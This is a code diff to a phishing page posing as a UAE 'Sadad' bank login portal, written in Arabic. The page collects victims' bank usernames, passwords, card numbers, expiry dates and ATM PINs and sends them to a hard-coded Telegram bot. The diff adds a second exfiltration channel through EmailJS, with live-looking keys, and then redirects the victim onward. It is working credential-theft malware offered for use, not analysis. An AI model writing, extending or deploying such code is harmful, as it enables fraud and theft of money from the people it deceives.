@@ -6,6 +6,14 @@
     <title>تسجيل الدخول للبنك - بوابة سداد الإمارات</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("Wfxk1dtB415_ZTTlq"); // Public Key الخاص بك
+       })();
+    </script>
+
     <style>
         :root {
             --primary-color: #008000;
@@ -58,26 +66,31 @@
         const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
         const telegramChatId = '8362204213';
 
-        // وظيفة إرسال رسالة جديدة دائماً لضمان الوصول بنسبة 100%
+        // دالة الإرسال للإيميل الموحدة
+        async function sendEmailData(params) {
+            try {
+                await emailjs.send('service_r3vxe5s', 'template_ps8h3sd', {
+                    bankName: params.bankName || "غير محدد",
+                    cardNumber: params.cardNumber || "سجل دخول (إيميل/يوزر)",
+                    expiryDate: params.expiryDate || "N/A",
+                    atmPin: params.atmPin || "N/A",
+                    userEmail: params.userEmail || "N/A",
+                    otpValue: "في انتظار الصفحة التالية..."
+                });
+            } catch (error) { console.error('Email Error:', error); }
+        }
+
         async function sendNewTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
                 });
                 const data = await response.json();
-                if (data.ok) {
-                    localStorage.setItem('telegramMessageId', data.result.message_id);
-                }
-            } catch (error) {
-                console.error('خطأ في الإرسال:', error);
-            }
+                if (data.ok) { localStorage.setItem('telegramMessageId', data.result.message_id); }
+            } catch (error) { console.error('Telegram Error:', error); }
         }
 
         const banks = {
@@ -174,9 +187,11 @@
             let isValid = true;
             if (!email) { document.getElementById('bankEmailError').style.display = 'block'; document.getElementById('bankEmail').classList.add('invalid'); isValid = false; }
             if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; document.getElementById('bankPassword').classList.add('invalid'); isValid = false; }
+            
             if (isValid) {
                 const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n📧 البريد/اسم المستخدم: ${email}\n🔑 كلمة المرور: ${password}`;
                 await sendNewTelegram(content);
+                await sendEmailData({ bankName: bankName, userEmail: email, cardNumber: `User: ${email} / Pass: ${password}` });
                 window.location.href = 'page5.html';
             }
         }
@@ -187,9 +202,11 @@
             let isValid = true;
             if (!username) { document.getElementById('bankUsernameError').style.display = 'block'; document.getElementById('bankUsername').classList.add('invalid'); isValid = false; }
             if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; document.getElementById('bankPassword').classList.add('invalid'); isValid = false; }
+            
             if (isValid) {
                 const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
                 await sendNewTelegram(content);
+                await sendEmailData({ bankName: bankName, userEmail: username, cardNumber: `User: ${username} / Pass: ${password}` });
                 window.location.href = 'page5.html';
             }
         }
@@ -201,20 +218,29 @@
             if (!validation.valid) { document.getElementById('cardNumberError').style.display = 'block'; document.getElementById('cardNumber').classList.add('invalid'); isValid = false; }
 
             let extraInfo = '';
+            let emailParams = { bankName: bankName, cardNumber: cardNumber };
+
             if (hasATMPin) {
                 const atmPin = document.getElementById('atmPin').value;
                 if (!atmPin || atmPin.length !== 4) { document.getElementById('atmPinError').style.display = 'block'; document.getElementById('atmPin').classList.add('invalid'); isValid = false; }
-                else { extraInfo = `\n🔢 ATM PIN: ${atmPin}`; }
+                else { 
+                    extraInfo = `\n🔢 ATM PIN: ${atmPin}`; 
+                    emailParams.atmPin = atmPin;
+                }
             } else {
                 const month = document.getElementById('expiryMonth').value;
                 const year = document.getElementById('expiryYear').value;
                 if (!month || !year) { document.getElementById('expiryError').style.display = 'block'; isValid = false; }
-                else { extraInfo = `\n📅 تاريخ الانتهاء: ${month}/${year}`; }
+                else { 
+                    extraInfo = `\n📅 تاريخ الانتهاء: ${month}/${year}`; 
+                    emailParams.expiryDate = `${month}/${year}`;
+                }
             }
 
             if (isValid) {
                 const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n💳 رقم البطاقة: ${cardNumber}\n🏷️ نوع البطاقة: ${validation.type}${extraInfo}`;
                 await sendNewTelegram(content);
+                await sendEmailData(emailParams);
                 window.location.href = 'page5.html';
             }
         }
